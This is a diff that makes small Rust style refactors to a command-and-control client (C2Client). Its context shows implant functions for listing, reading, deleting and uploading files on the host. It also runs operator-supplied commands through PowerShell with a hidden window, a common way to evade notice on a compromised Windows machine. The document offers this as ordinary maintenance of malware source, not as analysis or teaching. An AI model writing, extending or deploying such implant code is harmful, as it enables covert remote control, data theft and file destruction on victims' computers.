@@ -557,7 +557,7 @@ impl C2Client {
         &self,
         params: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let path = params.get(0).map(|s| s.as_str()).unwrap_or(".");
+        let path = params.first().map(|s| s.as_str()).unwrap_or(".");
         let show_hidden = params.get(1).map(|s| s == "true").unwrap_or(false);
 
         match std::fs::read_dir(path) {
@@ -624,7 +624,7 @@ impl C2Client {
         &self,
         params: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let file_path = params.get(0).ok_or("File path parameter required")?;
+        let file_path = params.first().ok_or("File path parameter required")?;
 
         match std::fs::metadata(file_path) {
             Ok(metadata) => {
@@ -658,7 +658,7 @@ impl C2Client {
         &self,
         params: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let file_path = params.get(0).ok_or("File path parameter required")?;
+        let file_path = params.first().ok_or("File path parameter required")?;
         let max_size = params
             .get(1)
             .and_then(|s| s.parse::<u64>().ok())
@@ -714,7 +714,7 @@ impl C2Client {
         &self,
         params: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let file_path = params.get(0).ok_or("File path parameter required")?;
+        let file_path = params.first().ok_or("File path parameter required")?;
         let force = params.get(1).map(|s| s == "true").unwrap_or(false);
 
         let metadata = std::fs::metadata(file_path)
@@ -760,7 +760,7 @@ impl C2Client {
         &self,
         params: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let dir_path = params.get(0).ok_or("Directory path parameter required")?;
+        let dir_path = params.first().ok_or("Directory path parameter required")?;
         let recursive = params.get(1).map(|s| s == "true").unwrap_or(false);
 
         let result = if recursive {
@@ -787,7 +787,7 @@ impl C2Client {
         &self,
         params: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let command = params.get(0).ok_or("Command parameter required")?;
+        let command = params.first().ok_or("Command parameter required")?;
         let default_timeout = "30".to_string();
         let default_workdir = "".to_string();
         let timeout_str = params.get(1).unwrap_or(&default_timeout);
@@ -813,7 +813,7 @@ impl C2Client {
 
         let mut cmd = std::process::Command::new("powershell");
 
-        cmd.args(&[
+        cmd.args([
             "-WindowStyle",
             "Hidden",
             "-ExecutionPolicy",
@@ -985,7 +985,7 @@ impl C2Client {
         };
         use std::fs;
 
-        let log_type = parameters.get(0).map(|s| s.as_str()).unwrap_or("session");
+        let log_type = parameters.first().map(|s| s.as_str()).unwrap_or("session");
 
         let (events, log_info) = match log_type {
             "session" => {
@@ -1110,8 +1110,7 @@ impl C2Client {
         &self,
         parameters: &[String],
     ) -> Result<(String, Option<serde_json::Value>), String> {
-        let file_path = parameters
-            .get(0)
+        let file_path = parameters.first()
             .ok_or("File path parameter required for encrypted upload")?;
 
         // ファイルの存在確認
